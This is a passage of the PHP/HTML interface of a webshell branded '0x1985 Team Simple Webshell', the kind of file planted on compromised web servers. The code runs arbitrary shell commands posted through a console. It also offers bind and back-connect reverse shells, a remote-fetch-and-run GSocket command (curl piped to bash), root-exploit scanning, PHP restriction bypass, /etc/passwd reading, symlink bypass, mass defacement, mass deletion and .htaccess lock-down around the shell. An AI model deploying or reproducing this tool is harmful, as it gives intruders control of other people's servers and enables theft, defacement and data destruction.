                        <i class="fa fa-cogs"></i> PHP Version: <?= $phpver; ?> | OS: <?= $phpos; ?>
                    </div>
                    <div class="breadcrumb">
                        <i class="fa fa fa-folder pt-1"></i> <?php foreach ($exdir as $id => $pat) : if ($pat == '' && $id == 0):?>
                        <a href="?dir=/" class="text-decoration-none text-light">/</a>
                        <?php endif; if ($pat == '') continue; ?>
                        <a href="?dir=<?= implode('/', array_slice($exdir, 0, $id + 1)) ?>" class="text-decoration-none text-light"><?= $pat ?></a><span class="text-light">/</span>
                        <?php endforeach; ?>
                         [ <?= writable($path, perms($path)) ?> ]
                        <div class="row">
                            <a href="?" class="text-decoration-none text-light"> [ HOME ] </a>
                        </div>
                    </div>
                    <div class="d-flex justify-content-between">
                        <div class="p-2">
                            <form action="" method="post">
                                <label for="name" class="form-label">Console</label>
                                <div class="row">
                                    <div class="col-md-9 mb-3">
                                        <input type="text" class="form-control form-control-sm" name="bdcmd" placeholder="whoami">
                                    </div>
                                    <div class="col-md-3">
                                        <button type="submit" class="btn btn-outline-light btn-sm">Submit</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div class="p-2">
                            <form action="" method="post" enctype="multipart/form-data">
                                <input class="form-check-input" type="radio" id="flexRadioDefault1" name="upl" value="current" checked>
                                <label class="form-label">Current Dir </label>
                                <input class="form-check-input" type="radio" id="flexRadioDefault2" name="upl" value="root">
                                <label class="form-label">Root Dir</label>
                                <div class="row">
                                    <div class="col-md-9 mb-3">
                                        <input type="file" class="form-control form-control-sm" name="uploadfile[]" multiple id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
                                    </div>
                                    <div class="col-md-3">
                                        <input type='submit' class="btn btn-outline-light btn-sm" value='Submit' name='submit'>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div class="container" id="tools">
                        <div class="collapse" id="uploadUrlCollapse" data-bs-parent="#tools" style="transition:none;">
                            <form action="" method="post">
                                <div class="mb-3">
                                    <label for="url" class="form-label">URL to Upload</label>
                                    <input type="text" class="form-control" name="url" placeholder="Enter URL here" required>
                                </div>
                                <div class="mb-3">
                                    <label for="filename" class="form-label">File Name</label>
                                    <input type="text" class="form-control" name="filename" placeholder="Enter file name" required>
                                </div>
                                <div class="mb-3">
                                    <label for="method" class="form-label">Upload Method</label>
                                    <select class="form-select" name="method" required>
                                        <option value="file_get_contents">file_get_contents</option>
                                        <option value="curl">cURL</option>
                                        <option value="fopen">fopen</option>
                                        <option value="copy">copy</option>
                                        <option value="stream_context">stream_context</option>
                                    </select>
                                </div>
                                <button type="submit" class="btn btn-outline-light">Upload</button>
                            </form>
                        </div>
                        <div class="collapse centered-container" id="networkCollapse" data-bs-parent="#tools" style="transition:none;">
                            <form method="post">
                                <input type="hidden" name="id" value="network">
                                <div class="card text-dark">
                                    <div class="card-header">
                                        <u>Bind port to /bin/sh [Perl]</u><br>
                                        <u>Port :</u>
                                        <div class="input-group">
                                            <input class="form-control btn-sm" type="text" name="port" placeholder="6969">
                                            <input class="btn btn-dark btn-sm" type="submit" name="bpl" value="submit">
                                        </div>
                                        <h5>Back-Connect</h5>
                                        <u>Server :</u>
                                        <input class="form-control btn-sm" type="text" name="server" placeholder="<?= $_SERVER['REMOTE_ADDR'] ?>">
                                        <u>Port :</u>
                                        <div class="input-group">
                                            <input class="form-control btn-sm" type="text" name="port" placeholder="6969">
                                            <select class="form-control btn-sm" name="bc">
                                                <option value="perl">perl</option>
                                                <option value="python">python</option>
                                            </select>
                                        </div>
                                        <div class="d-grid gap-2">
                                            <input class="btn btn-dark btn-sm btn-block" type="submit" value="submit">
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div class="collapse centered-container" id="realGsocketCollapse" data-bs-parent="#tools" style="transition:none;">
                            <form action="" method="post" id="gsocketForm">
                                <div class="mb-3">
                                    <label class="form-label">GSocket Mode</label>
                                    <div class="form-check">
                                        <input class="form-check-input" type="radio" name="gsocketMode" value="auto" id="gsocketAuto" checked onclick="toggleManualInput(false)">
                                        <label class="form-check-label" for="gsocketAuto">Auto</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="radio" name="gsocketMode" value="manual" id="gsocketManual" onclick="toggleManualInput(true)">
                                        <label class="form-check-label" for="gsocketManual">Manual</label>
                                    </div>
                                </div>
                                <div class="mb-3" id="manualCommandInput" style="display:none;">
                                    <label for="gsocketCommand" class="form-label">GSocket Command</label>
                                    <input type="text" class="form-control" name="gsocketCommand" placeholder="bash -c '$(curl -fsSL https://gsocket.io/y)'">
                                </div>
                                <button type="submit" class="btn btn-outline-light">Run GSocket</button>
                            </form>
                        </div>
                        <div class="collapse centered-container" id="autoRootCollapse" data-bs-parent="#tools" style="transition:none;">
                            <div class="text-center">
                                <div class="btn-group mb-3">
                                    <a class="btn btn-outline-light btn-sm" href="?dir=<?= $path ?>&id=scan_root&id_two=autoscan"><i class="bi bi-bug"></i> Auto Scan</a>
                                    <a class="btn btn-outline-light btn-sm" href="?dir=<?= $path ?>&id=scan_root&id_two=scansd"><i class="bi bi-search"></i> Scan SUID</a>
                                    <a class="btn btn-outline-light btn-sm" href="?dir=<?= $path ?>&id=scan_root&id_two=esg"><i class="bi bi-search"></i> Exploit Suggester</a>
                                </div>
                            </div>
                        </div>
                        <div class="collapse centered-container" id="bypassPhpCollapse" data-bs-parent="#tools" style="transition:none;">
                            <form action="" method="post">
                                <div class="mb-3">
                                    <label for="phpIniPath" class="form-label">PHP Version (Detected: <?= phpversion(); ?>)</label>
                                    <input type="text" class="form-control" name="phpIniPath" value="<?= $phpIniPath; ?>" readonly>
                                </div>
                                <button type="submit" class="btn btn-outline-light" name="bypassPhpIni">Bypass PHP Restrictions</button>
                            </form>
                        </div>
                        <div class="collapse" id="phpMailerCollapse" data-bs-parent="#tools" style="transition:none;">
                            <form action="" method="post">
                                <div class="mb-3">
                                    <label for="email_penerima" class="form-label">Email Receiver</label>
                                    <input type="email" class="form-control" name="email_penerima" placeholder="Enter recipient email" required>
                                </div>
                                <div class="mb-3">
                                    <label for="subjek" class="form-label">Subject</label>
                                    <input type="text" class="form-control" name="subjek" placeholder="Enter email subject" required>
                                </div>
                                <div class="mb-3">
                                    <label for="pesan" class="form-label">Message</label>
                                    <textarea class="form-control" rows="7" name="pesan" placeholder="Enter your message"></textarea>
                                </div>
                                <button type="submit" class="btn btn-outline-light" name="sendmsg">Send Email</button>
                            </form>
                        </div>
                        <div class="collapse" id="htaccessCollapse" data-bs-parent="#tools" style="transition:none;">
                            <form action="" method="post" id="defenseShellForm">
                                <div class="mb-3">
                                    <label class="form-label">.htaccess Options</label>
                                    <div class="form-check">
                                        <input class="form-check-input" type="radio" name="content" value="content1" checked onclick="toggleShellNameInput(false)">
                                        <label class="form-check-label">Allow All Files</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="radio" name="content" value="content2" onclick="toggleShellNameInput(true)">
                                        <label class="form-check-label" for="content2">Allow Only Your Shell</label>
                                    </div>
                                </div>
                                <div class="mb-3" id="shellNameInput" style="display:none;">
                                    <label for="namafile" class="form-label">Shell Name(s) (e.g., index.php|shell.php)</label>
                                    <input type="text" class="form-control" name="namafile" placeholder="Enter shell file names">
                                    <small class="form-text text-muted">Use | to separate multiple files (e.g., aa.php|bb.php).</small>
                                </div>
                                <button type="submit" class="btn btn-outline-light" name="createhates">Create .htaccess</button>
                            </form>
                        </div>
                        <div class="collapse" id="symlinkCollapse" data-bs-parent="#tools" style="transition:none;">
                            <form action="" method="post">
                                <div class="mb-3">
                                    <label for="home" class="form-label">Home Directory Path</label>
                                    <input type="text" class="form-control" name="home" placeholder="e.g., /home" required>
                                </div>
                                <div class="mb-3">
                                    <label for="folderName" class="form-label">Output Folder Name</label>
                                    <input type="text" class="form-control" name="folderName" placeholder="e.g., symlinks" required>
                                </div>
                                <div class="mb-3">
                                    <label for="passwd" class="form-label">/etc/passwd Content</label>
                                    <textarea class="form-control" rows="7" name="passwd" placeholder="Enter /etc/passwd content" required></textarea>
                                </div>
                                <button type="submit" class="btn btn-outline-light" name="symlinkConf">Create Symlinks</button>
                            </form>
                        </div>
                        <div class="collapse" id="readPasswdCollapse" data-bs-parent="#tools" style="transition:none;">
                            <form action="" method="post">
                                <button type="submit" name="readPasswd" class="btn btn-outline-light">Read /etc/passwd</button>
                            </form>
                        </div>
                        <div class="collapse" id="massDefaceCollapse" data-bs-parent="#tools" style="transition:none;">
                            <form method="post">
                                <input type="hidden" name="id" value="mass_deface">
                                <div class="card card-body text-dark input-group mb-3">
                                    <u>Mass Deface</u>
                                    <div class="form-check">
                                        <input class="form-check-input" type="radio" value="onedir" name="tipe" id="flexCheckOnedir" checked>
                                        <label class="form-check-label" for="flexCheckOnedir">One dir</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="radio" value="mass" name="tipe" id="flexCheckMass">
                                        <label class="form-check-label" for="flexCheckMass">All directory</label>
                                    </div>
                                    <div class="mb-3">
                                        <label for="d_dir" class="form-label"><i class="bi bi-folder"></i> Directory:</label>
                                        <input class="form-control btn-sm" type="text" name="d_dir" value="<?= $path ?>">
                                    </div>
                                    <div class="mb-3">
                                        <label for="d_file" class="form-label"><i class="bi bi-file-earmark"></i> Filename:</label>
                                        <input class="form-control btn-sm" type="text" name="d_file" placeholder="index.html">
                                    </div>
                                    <div class="mb-3">
                                        <label for="script" class="form-label"><i class="bi bi-file-earmark"></i> Your script:</label>
                                        <textarea class="form-control btn-sm" rows="7" name="script" placeholder="Your deface script"></textarea>
                                    </div>
                                    <div class="d-grid gap-2">
                                        <input class="btn btn-dark btn-sm" type="submit" name="start" value="Deface">
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div class="collapse" id="massDeleteCollapse" data-bs-parent="#tools" style="transition:none;">
                            <form method="post">
                                <input type="hidden" name="id" value="mass_delete">
                                <div class="card card-body text-dark input-group mb-3">
                                    <u>Mass Delete</u>
                                    <div class="mb-3">
                                        <label for="d_dir" class="form-label"><i class="bi bi-folder"></i> Directory:</label>
                                        <input class="form-control btn-sm" type="text" name="d_dir" value="<?= $path ?>">
                                    </div>
                                    <div class="mb-3">
                                        <label for="d_file" class="form-label"><i class="bi bi-file-earmark"></i> Filename:</label>
                                        <input class="form-control btn-sm" type="text" name="d_file" placeholder="index.html">
                                    </div>
                                    <div class="d-grid gap-2">
                                        <input class="btn btn-dark btn-sm" type="submit" name="start" value="Delete">
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div class="collapse centered-container" id="searchByExtCollapse" data-bs-parent="#tools" style="transition:none;">
                            <form method="post">
                                <input type="hidden" name="id" value="searchbyEXT">
                                <div class="card card-body text-dark input-group mb-3">
                                    <u>Search By EXT</u>
                                    <div class="mb-3">
                                        <div class="d-flex align-items-center gap-2">
                                            <i class="bi bi-folder"></i> Directory:
                                        </div>
                                        <input class="form-control btn-sm" type="text" name="d_dir" value="<?= $path ?>" required>
                                    </div>
                                    <div class="mb-3">
                                        <div class="d-flex align-items-center gap-2">
                                            <i class="bi bi-file-earmark"></i> EXT:
                                        </div>
                                        <input class="form-control btn-sm" type="text" name="extensi" placeholder="php" required>
                                    </div>
                                    <div class="form-check mb-3">
                                        <input class="form-check-input" type="checkbox" name="sort_by_date" id="sort_by_date">
                                        <label class="form-check-label" for="sort_by_date">Sort by date</label>
                                    </div>
                                    <div class="d-grid gap-2">
                                        <input class="btn btn-dark btn-sm" type="submit" name="start" value="Search">
                                    </div>
                                </div>
                            </form>
                        </div>
                        <a data-bs-toggle="collapse" href="#uploadUrlCollapse" role="button" aria-expanded="false" aria-controls="uploadUrlCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-link"></i> Upload from URL</a>
                        <a data-bs-toggle="collapse" href="#networkCollapse" role="button" aria-expanded="false" aria-controls="networkCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-plug"></i> Network Tools</a>
                        <a data-bs-toggle="collapse" href="#realGsocketCollapse" role="button" aria-expanded="false" aria-controls="realGsocketCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-plug"></i> Real GSocket</a>
                        <a data-bs-toggle="collapse" href="#autoRootCollapse" role="button" aria-expanded="false" aria-controls="autoRootCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="bi bi-bug"></i> Auto Root</a>
                        <a data-bs-toggle="collapse" href="#bypassPhpCollapse" role="button" aria-expanded="false" aria-controls="bypassPhpCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-unlock"></i> Bypass PHP</a>
                        <a data-bs-toggle="collapse" href="#phpMailerCollapse" role="button" aria-expanded="false" aria-controls="phpMailerCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-envelope"></i> Send Email</a>
                        <a data-bs-toggle="collapse" href="#htaccessCollapse" role="button" aria-expanded="false" aria-controls="htaccessCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-shield-alt"></i> Create .htaccess</a>
                        <a data-bs-toggle="collapse" href="#symlinkCollapse" role="button" aria-expanded="false" aria-controls="symlinkCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-link"></i> Symlink Bypass</a>
                        <a data-bs-toggle="collapse" href="#readPasswdCollapse" role="button" aria-expanded="false" aria-controls="readPasswdCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-alt"></i> Read /etc/passwd</a>
                        <a data-bs-toggle="collapse" href="#massDefaceCollapse" role="button" aria-expanded="false" aria-controls="massDefaceCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="bi bi-file-earmark-break"></i> Mass Deface</a>
                        <a data-bs-toggle="collapse" href="#massDeleteCollapse" role="button" aria-expanded="false" aria-controls="massDeleteCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="bi bi-trash"></i> Mass Delete</a>
                        <a data-bs-toggle="collapse" href="#searchByExtCollapse" role="button" aria-expanded="false" aria-controls="searchByExtCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-search"></i> Search By EXT</a>
                        <?php if (isset($_POST['bdcmd'])) : ?>
                            <div class="p-2">
                                <div class="row justify-content-center">
                                    <div class='card text-dark mb-3'>
                                        <pre><?php echo $ip . "@" . $_SERVER['HTTP_HOST'] . ": ~$ "; $cmd = $_POST['bdcmd']; echo htmlspecialchars($cmd) . "<br>"; ?><br><code><?php if (!in_array('shell_exec', $disabledFunctions)) { echo htmlspecialchars(shell_exec($cmd . ' 2>&1')); } else { echo "shell_exec is disabled"; } ?></code></pre>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>
                        <?php if (isset($_POST['readPasswd']) && isset($_SESSION['passwdContent'])) : ?>
                            <div class="p-2">
                                <div class="row justify-content-center">
                                    <div class='card text-dark mb-3'>
                                        <pre><code><?= $_SESSION['passwdContent']; ?></code></pre>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>
                        <?php if (isset($_GET['id']) && $_GET['id'] == 'scan_root' && isset($_GET['id_two'])) : ?>
                            <div class="p-2">
                                <div class="row justify-content-center">
                                    <div class='card text-dark mb-3'>
                                        <pre><code><?= htmlspecialchars($output); ?></code></pre>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>
                        <?php if (isset($_GET['action']) && $_GET['action'] != 'delete') : $action = $_GET['action']; $item = $_GET['item']; ?>
                            <div class="row justify-content-center">
                                <?php if ($action == 'rename' && isset($_GET['item'])) : ?>
                                    <form action="" method="post">
                                        <div class="mb-3">
                                            <label for="name" class="form-label">New Name</label>
                                            <input type="text" class="form-control" name="newName" value="<?= htmlspecialchars($item) ?>">
                                        </div>
                                        <button type="submit" class="btn btn-outline-light">Submit</button>
                                        <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
                                    </form>
                                <?php elseif ($action == 'edit' && isset($_GET['item'])) : ?>
                                    <form action="" method="post">
                                        <div class="mb-3">
                                            <label for="name" class="form-label">Item</label>
                                            <textarea id="CopyFromTextArea" name="newContent" rows="10" class="form-control"><?= htmlspecialchars(file_get_contents($path . '/' . $item)) ?></textarea>
                                        </div>
                                        <button type="submit" class="btn btn-outline-light">Submit</button>
                                        <button type="button" class="btn btn-outline-light" onclick="jscopy()">Copy</button>
                                        <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
                                    </form>
                                <?php elseif ($action == 'view' && isset($_GET['item'])) : ?>
                                    <div class="mb-3">
                                        <label for="name" class="form-label">File Name: <?= htmlspecialchars($item) ?></label>
                                        <textarea name="newContent" rows="10" class="form-control" disabled><?= htmlspecialchars(file_get_contents($path . '/' . $item)) ?></textarea>
                                        <br>
                                        <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
                                    </div>
                                <?php elseif ($action == 'chmod' && isset($_GET['item'])) : ?>
                                    <form action="" method="post">
                                        <div class="mb-3">
                                            <label for="name" class="form-label"><?= htmlspecialchars($item) ?></label>
                                            <input type="text" class="form-control" name="newPerm" value="<?= substr(sprintf('%o', fileperms($path . '/' . $item)), -4); ?>">
                                        </div>
                                        <button type="submit" class="btn btn-outline-light">Submit</button>
                                        <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
                                    </form>
                                <?php endif; ?>
                            </div>
                        <?php endif; ?>
                        <div class="row justify-content-center">
                            <div class="collapse" id="newFolderCollapse" data-bs-parent="#tools" style="transition:none;">
                                <form action="" method="post">
                                    <div class="mb-3">
                                        <label for="name" class="form-label">Folder Name</label>
                                        <input type="text" class="form-control" name="newFolderName" placeholder="0x1985 Team Simple Webshell">
                                    </div>
                                    <button type="submit" class="btn btn-outline-light">Submit</button>
                                </form>
                            </div>
                            <div class="collapse" id="newFileCollapse" data-bs-parent="#tools" style="transition:none;">
                                <form action="" method="post">
                                    <div class="mb-3">
                                        <label for="name" class="form-label">File Name</label>
                                        <input type="text" class="form-control" name="newFileName" placeholder="0x1985 Team Simple Webshell.php">
                                    </div>
                                    <div class="mb-3">
                                        <label for="name" class="form-label">File Content</label>
                                        <textarea name="newFileContent" rows="10" class="form-control" placeholder="Hello World - 0x1985 Team Simple Webshell"></textarea>
                                    </div>
                                    <button type="submit" class="btn btn-outline-light">Submit</button>
                                </form>
                            </div>
                        </div>
                    </div>
                    <div class="table-responsive">
                        <table class="table table-hover table-dark text-light">
                            <thead>
                                <tr>
                                    <td style="width:35%">Name</td>
                                    <td style="width:10%">Type</td>
                                    <td style="width:10%">Size</td>
                                    <td style="width:13%">Owner/Group</td>
                                    <td style="width:10%">Permission</td>
                                    <td style="width:13%">Last Modified</td>
                                    <td style="width:9%">Actions</td>
                                </tr>
                            </thead>
                            <tbody class="text-nowrap">
                                <?php foreach ($dirs as $dir) : if (!is_dir($dir)) continue; ?>
                                <tr>
                                    <td>
                                        <?php if ($dir === '..') : ?>
                                            <a href="?dir=<?= dirname($path); ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                                        <?php elseif ($dir === '.') : ?>
                                            <a href="?dir=<?= $path; ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                                        <?php else : ?>
                                            <a href="?dir=<?= $path . '/' . $dir; ?>" class="text-decoration-none text-light"><i class="fa fa-folder"></i> <?= $dir ?></a>
                                        <?php endif; ?>
                                    </td>
                                    <td class="text-light"><?= filetype($path . '/' . $dir) ?></td>
                                    <td class="text-light">-</td>
                                    <td class="text-light"><?= getOwner($path . '/' . $dir) ?></td>
                                    <td class="text-light">
                                        <?php
                                        if (is_writable($path . '/' . $dir)) echo '<font color="lime">';
                                        elseif (!is_readable($path . '/' . $dir)) echo '<font color="red">';
                                        echo perms($path . '/' . $dir);
                                        if (is_writable($path . '/' . $dir) || !is_readable($path . '/' . $dir)) echo '</font>';
                                        ?>
                                    </td>
                                    <td class="text-light"><?= date("Y-m-d h:i:s", filemtime($path . '/' . $dir)); ?></td>
                                    <td>
                                        <?php if ($dir != '.' && $dir != '..') : ?>
                                            <div class="btn-group">
                                                <a href="?dir=<?= $path; ?>&item=<?= $dir; ?>&action=rename" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-edit"></i></a>
                                                <a href="?dir=<?= $path; ?>&item=<?= $dir; ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-signature"></i></a>
                                                <a href="#" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path; ?>&item=<?= $dir; ?>&action=delete')"><i class="fa fa-trash"></i></a>
                                            </div>
                                        <?php elseif ($dir === '.') : ?>
                                            <div class="btn-group">
                                                <a data-bs-toggle="collapse" href="#newFolderCollapse" role="button" aria-expanded="false" aria-controls="newFolderCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-folder-plus"></i></a>
                                                <a data-bs-toggle="collapse" href="#newFileCollapse" role="button" aria-expanded="false" aria-controls="newFileCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-plus"></i></a>
                                            </div>
                                        <?php endif; ?>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                                  <?php foreach ($dirs as $dir) : if (!is_file($dir)) continue; ?>
                                    <tr>
                                        <td>
                                            <a href="?dir=<?= $path; ?>&item=<?= $dir; ?>&action=view" class="text-decoration-none text-light"><i class="fa fa-file-code"></i> <?= $dir ?></a>
                                        </td>
                                        <td class="text-light"><?= filetype($path . '/' . $dir) ?></td>
                                        <td class="text-light"><?= fsize($path . '/' . $dir) ?></td>
                                        <td class="text-light"><?= getOwner($path . '/' . $dir) ?></td>
                                        <td class="text-light">
                                            <?php
                                            if (is_writable($path . '/' . $dir)) echo '<font color="lime">';
                                            elseif (!is_readable($path . '/' . $dir)) echo '<font color="red">';
                                            echo perms($path . '/' . $dir);
                                            if (is_writable($path . '/' . $dir) || !is_readable($path . '/' . $dir)) echo '</font>';
                                            ?>
                                        </td>
                                        <td class="text-light"><?= date("Y-m-d h:i:s", filemtime($path . '/' . $dir)); ?></td>
                                        <td>
                                            <div class="btn-group">
                                                <a href="?dir=<?= $path; ?>&item=<?= $dir; ?>&action=edit" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-edit"></i></a>
                                                <a href="?dir=<?= $path; ?>&item=<?= $dir; ?>&action=rename" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-i-cursor"></i></a>
                                                <a href="?dir=<?= $path; ?>&item=<?= $dir; ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-signature"></i></a>
                                                <a href="#" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path; ?>&item=<?= $dir; ?>&action=delete')"><i class="fa fa-trash"></i></a>
                                            </div>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                    <hr>
                    <div class="text-center">
                        <p class="text-light">0x1985 Team Simple Webshell &copy; <?= date('Y'); ?> - Coded </i> by <a href="https://github.com/0x1985 Team Simple Webshell-BD" class="text-decoration-none text-light anu">0x1985 Alexithema</a></p>
                    </div>
                </div>
            </div>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
    </body>
</html>
